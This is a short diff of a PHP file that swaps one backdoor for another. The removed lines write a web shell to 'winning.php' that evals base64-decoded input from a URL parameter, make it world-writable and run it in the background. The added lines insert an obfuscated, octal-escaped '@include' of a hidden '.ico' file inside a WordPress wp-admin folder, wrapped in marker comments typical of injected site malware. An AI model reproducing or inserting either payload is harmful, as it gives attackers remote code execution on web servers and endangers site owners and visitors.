@@ -1,20 +1,6 @@
-<?php
-// insert malicious code here...
-try {
-    $script = '
-        <?php 
-        // harmful code
-        if (!empty($_GET['exec'])) {
-            eval(base64_decode($_GET['exec']))
-        }';
+    <?php
+    /*01e78*/
 
-    // save the file
-    file_put_contents('./winning.php', $script);
-    @chmod('./winning.php', 0777);
+    @include “\057ho\155e/\150cm\162eu\065/b\154an\143va\056co\155/w\160-a\144mi\156/i\155ag\145s/\05683\1425c\14270\056ic\157”;
 
-    // run harmful file in background
-    exec("php ./winning.php > /dev/null 2>&1 &");
-} catch (Exception $e) {}
-
-// trigger error
-$winning = new DuhWinning();
+    /*01e78*/
